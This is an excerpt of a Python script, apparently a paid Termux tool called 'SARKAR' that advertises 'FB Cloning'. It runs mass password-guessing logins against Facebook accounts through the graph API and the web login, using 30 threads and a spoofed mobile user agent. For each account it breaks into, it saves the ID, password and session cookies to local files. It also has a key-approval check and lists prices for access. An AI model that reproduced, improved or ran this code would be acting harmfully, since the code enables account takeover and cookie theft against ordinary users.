...
os.system('clear')
print('         \x1b[38;5;46m WELCOME TO SARKAR WORLD          ')
...
__________________________________________________
 ...
 \033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31mAUTHOR:MR:SARKAR\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
──────────────────────────────────────────────────
\033[1;92m Owner   :            MR:SARKAR
\033[1;92m Facebook:            Mr:Sarkar Anuj Singh
\033[1;92m Github  :            Mr-SARKAR
...
filter = []
os.system("xdg-open https://t.me/mrnixtermuxtool")
sys.stdout.write('\x1b]2; Mr:SARKAR\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
def menu():   
  ...
  ###  elif select =='2':
       ...
       os.system('xdg-open https://t.me/+918199897921');menu()
    else:
        print('\n Select Wrong option ... ')
        time.sleep(2)
        SARKAR(allkey)
       # os.system('xdg-open https://wa.me/+918199897921')
#---------------------[ USER - AGENT ] -------------------#
def uaxxx():
    ua='[FBAN/FB4A;FBAV/83.0.0.5091;FBBV/8586033;FBDM/{density=1,width=720,height=1280};FBLC/en_US;FBRV/5718626;FBCR/null;FBMF/sony Ericsson Xperia U;FBBD/sony Ericsson Xperia U;FBPN/com.facebook.katana;FBDV/;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    return ua
...
'Content-Length': str(len(content_lenght))}
                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SARKARb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SARKARb};{ckkk}"
                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mSARKAR-❤️\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                    
                    Elite(sid,ps,ckkk)
                    oks.append(sid)                 
                    open('/sdcard/SARKAR/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/SARKAR/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r\x1b[1;96m [SARKAR-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SARKAR/M1-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/SARKAR/OK_ids_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SARKAR/COOKiEs_M3.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                   # print(f"\r\x1b[1;96m [SARKAR-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/SARKAR/M3-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard//SARKAR/OK_ids_M2.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/SARKAR/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r\x1b[1;96m [NIX-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/SARKAR/M2-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/SARKAR/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/NIX/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                  #    print(f"\r\x1b[1;96m [Fuck] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard//SARKAR/M4-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def pasw(self):       
            ...
            print("\x1b[38;5;46mCloneing Start Time \x1b[1;92m●\x1b[38;5;46m ", current_time)
            print("\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            with Sarkar(max_workers=30) as SARKARworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            pwx =  pw
                            if 'methodA' in methods:
                                SARKARworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                SARKARworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                SARKARworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                SARKARworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[SARKAR-OK] '+cid+' | '+ps+'\033[0;97m')
                print('\n[‎‎💖]\033[0;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m')
                linex()
                open('SARKAR-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[SARKAR-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('SARKAR-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;92m[SARKAR]\033[1;92m] %s|\33[1;31m[OK]:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass 
############            
...
def main_apv():
    ...
    print("\x1b[1;92m--------------------------------------------------")
    try:
        system = requests.get("https://github.com/S9RK9R-Xd/Paid/blob/main/Approve.txt").text 
        if Xyteee in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
            ...
            print('\033[1;92m Now it will work well in all countries')
            print('\033[1;92m-----------------------------------------------------\033[1;97m')
            print('\033[1;92m[\033[1;92m•\033[1;92m]\033[1;92m Notes : SARKAR Tools Can buy in all countries!')
            print('\033[1;92m-----------------------------------------------------\033[1;97m')
            print('\033[1;92m [\033[1;92m1\033[1;92m]\033[1;92m 8$ \033[1;92mApproval For 1 month')
            print(' \033[1;92m[\033[1;92m2\033[1;92m]\033[1;92m 6$ \033[1;92mApproval For 15 days')
            print(' \033[1;92m[\033[1;92m3\033[1;92m]\033[1;92m 3$ \033[1;92mApproval For 7 days \033[1;37m')
            ...
            print("\x1b[1;92m Tools    : FB Cloning");print(" \033[1;92m\n \033[1;92m\033[1;92mNote: If You Are Free User Don't Come IB\033[0;0m");print('\n\x1b[1;92m [•] File Crack \x1b[1;92m\n [•] Random Crack \n [•] Exit Program')
            print("-----------------------------------------------------")
            url_wa = "https://api.whatsapp.com/send?phone=+918199897921&text="
            choice = input(" Enter your choice  : ")
            tks = ("Hi Sarkar Sir, I Need To Buy Your SARKAR Tools Version 0.0.4 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
...
with Sarkar(max_workers=30) as rhu:
 #   rhu.submit(sexy)
    rhu.submit(main_apv)
